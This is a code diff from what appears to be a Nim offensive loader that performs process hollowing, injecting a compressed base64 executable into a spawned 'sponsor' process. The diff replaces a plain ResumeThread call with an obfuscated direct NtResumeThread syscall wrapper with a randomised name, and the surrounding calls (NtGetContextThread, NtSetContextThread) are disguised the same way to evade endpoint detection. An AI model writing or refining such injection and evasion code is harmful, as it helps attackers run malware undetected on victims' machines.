@@ -247,7 +247,7 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
     if VzpSdkMDEGHOzTpB( # NtGetContextThread
         sponsorThreadHandle, 
         addr context
-        ) != 0:
+    ) != 0:
         when not defined(release): echo "[-] Could not read from sponsor process PEB"
         quit()
     var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
@@ -255,13 +255,19 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
     context.Rcx = cast[DWORD64](entryPoint)
     if IGyhziwCULdezDSq( # NtSetContextThread
         sponsorThreadHandle, addr context
-        ) != 0:
+    ) != 0:
         when not defined(release): echo "[-] Could not write to from sponsor process PEB"
         quit()
     
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming remote thread"
-    ResumeThread(sponsorThreadHandle)
+    if mAcJDfMgbUNFgsxu( # NtResumeThread
+        sponsorThreadHandle,
+        NULL
+    ) != 0:
+        when not defined(release): echo "[-] Could resume the thread"
+        quit()
+
    
 
 proc execute(injectionMethod: int, compressedBase64PE: string, sponsorCmd: string = getAppFilename(), ppid: int = 0): bool =
